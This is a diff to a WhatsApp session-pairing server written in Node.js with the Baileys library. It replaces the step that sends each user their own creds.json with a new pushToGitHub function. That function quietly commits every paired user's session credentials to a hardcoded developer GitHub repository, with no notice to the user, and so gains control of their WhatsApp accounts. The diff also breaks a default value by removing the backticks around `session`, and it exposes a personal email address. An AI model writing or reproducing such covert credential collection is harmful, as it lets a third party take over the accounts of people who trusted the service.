@@ -1,6 +1,7 @@
 import express from 'express';
 import fs from 'fs';
 import pino from 'pino';
+import { execSync } from 'child_process';
 import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
 import pn from 'awesome-phonenumber';
 
@@ -16,17 +17,54 @@ function removeFile(FilePath) {
     }
 }
 
+// رفع الملف إلى GitHub
+function pushToGitHub(filePath, commitMessage = 'Update MysticSession creds.json') {
+    try {
+        const GITHUB_USERNAME = 'K0reem0';
+        const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
+        const GITHUB_REPO = 'TheMystic-Bot-MD';
+
+        if (!GITHUB_TOKEN) {
+            console.error('❌ GitHub token is missing!');
+            return;
+        }
+
+        // إعداد معلومات git
+        execSync('git config user.name "K0reem0"');
+        execSync('git config user.email "202470349@su.edu.ye"');
+
+        // التأكد أن المجلد موجود
+        const targetDir = './MysticSession';
+        if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });
+
+        // نسخ الملف
+        fs.copyFileSync(filePath, `${targetDir}/creds.json`);
+
+        // إضافة ورفع الملف
+        execSync('git add MysticSession/creds.json');
+        const stagedFiles = execSync('git diff --cached --name-only').toString().trim();
+        if (!stagedFiles) {
+            console.log('⚠️ No changes to commit.');
+            return;
+        }
+        execSync(`git commit -m "${commitMessage}"`);
+        const remoteUrl = `https://${GITHUB_USERNAME}:${GITHUB_TOKEN}@github.com/${GITHUB_USERNAME}/${GITHUB_REPO}.git`;
+        execSync(`git push ${remoteUrl} HEAD`);
+        console.log(`✅ Pushed ${stagedFiles} to GitHub`);
+    } catch (e) {
+        console.error('❌ Error pushing to GitHub:', e.message);
+    }
+}
+
 router.get('/', async (req, res) => {
     let num = req.query.number;
-    let dirs = './' + (num || `session`);
+    let dirs = './' + (num || session);
 
-    // حذف الجلسة القديمة
+    // حذف الجلسة القديمة  
     await removeFile(dirs);
 
-    // تنظيف الرقم من أي رموز غير الأرقام
+    // تنظيف الرقم
     num = num.replace(/[^0-9]/g, '');
-
-    // التحقق من صحة الرقم
     const phone = pn('+' + num);
     if (!phone.isValid()) {
         if (!res.headersSent) {
@@ -34,8 +72,6 @@ router.get('/', async (req, res) => {
         }
         return;
     }
-
-    // صيغة دولية E.164 بدون "+"
     num = phone.getNumber('e164').replace('+', '');
 
     async function initiateSession() {
@@ -62,14 +98,12 @@ router.get('/', async (req, res) => {
                 maxRetries: 5,
             });
 
-            // تحديث بيانات الجلسة
             KnightBot.ev.on('creds.update', async () => {
                 await saveCreds();
                 credsReady = true;
                 console.log("💾 Credentials updated and saved");
             });
 
-            // متابعة حالة الاتصال
             KnightBot.ev.on('connection.update', async (update) => {
                 const { connection, lastDisconnect, isNewLogin, isOnline } = update;
 
@@ -77,39 +111,18 @@ router.get('/', async (req, res) => {
                     console.log("✅ Connected successfully!");
 
                     await delay(5000);
-                    
+
                     try {
-                        const sessionKnight = fs.readFileSync(dirs + '/creds.json');
-                        const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
-
-                        await KnightBot.sendMessage(userJid, {
-                            document: sessionKnight,
-                            mimetype: 'application/json',
-                            fileName: 'creds.json'
-                        });
-                        console.log("📄 Session file sent successfully");
-
-                        await KnightBot.sendMessage(userJid, {
-                            image: { url: 'https://files.catbox.moe/yjj0x6.jpg' },
-                            caption: `شكرا لإستخدامك بوت هايسو 🤗`
-                        });
-
-                        await KnightBot.sendMessage(userJid, {
-                            text: `⚠️ لا تشارك هذا الملف مع أحد آخر ⚠️\n 
-┌┤✑  هايسو بوت
-│└────────────┈ ⳹        
-│©2024 AURTHER 
-└─────────────────┈ ⳹\n\n`
-                        });
-
-                        console.log("⚠️ Warning message sent successfully");
+                        // رفع الملف إلى GitHub بدلاً من إرساله
+                        pushToGitHub(`${dirs}/creds.json`, `Update creds.json for ${num}`);
+                        console.log("📤 creds.json uploaded to GitHub");
 
                         // تنظيف الجلسة
                         await delay(6000);
                         removeFile(dirs);
                         console.log("✅ Session cleaned up successfully");
                     } catch (error) {
-                        console.error("❌ Error sending messages:", error);
+                        console.error("❌ Error pushing creds.json:", error);
                         removeFile(dirs);
                     }
                 }
@@ -128,7 +141,6 @@ router.get('/', async (req, res) => {
                 }
             });
 
-            // طلب كود الاقتران
             if (!KnightBot.authState.creds.registered) {
                 await delay(3000);
                 num = num.replace(/[^\d+]/g, '');
@@ -160,7 +172,6 @@ router.get('/', async (req, res) => {
     await initiateSession();
 });
 
-// معالجة الأخطاء العامة
 process.on('uncaughtException', (err) => {
     let e = String(err);
     if (e.includes("conflict")) return;
